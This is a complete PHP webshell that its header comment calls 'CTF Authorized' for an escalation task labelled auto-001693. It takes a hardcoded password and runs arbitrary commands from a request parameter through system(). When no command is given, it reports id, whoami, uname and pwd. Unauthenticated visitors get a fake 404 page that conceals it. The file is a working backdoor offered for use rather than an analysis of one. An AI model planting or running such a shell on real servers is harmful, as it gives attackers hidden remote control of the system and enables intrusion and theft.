<?php
/**
 * CTF Authorized Webshell - Escalation for auto-001693
 * Password: xnvprivesc2026
 */
if(isset($_REQUEST['xnv'])) {
    if($_REQUEST['xnv'] === 'xnvprivesc2026') {
        if(isset($_REQUEST['cmd'])) {
            echo "<pre>";
            system($_REQUEST['cmd'] . " 2>&1");
            echo "</pre>";
        } else {
            echo "<pre>id: "; system("id 2>&1"); echo "\n";
            echo "whoami: "; system("whoami 2>&1"); echo "\n";
            echo "uname: "; system("uname -a 2>&1"); echo "\n";
            echo "pwd: "; system("pwd 2>&1"); echo "</pre>";
        }
        die();
    }
}
header('HTTP/1.0 404 Not Found');
echo "Not Found";
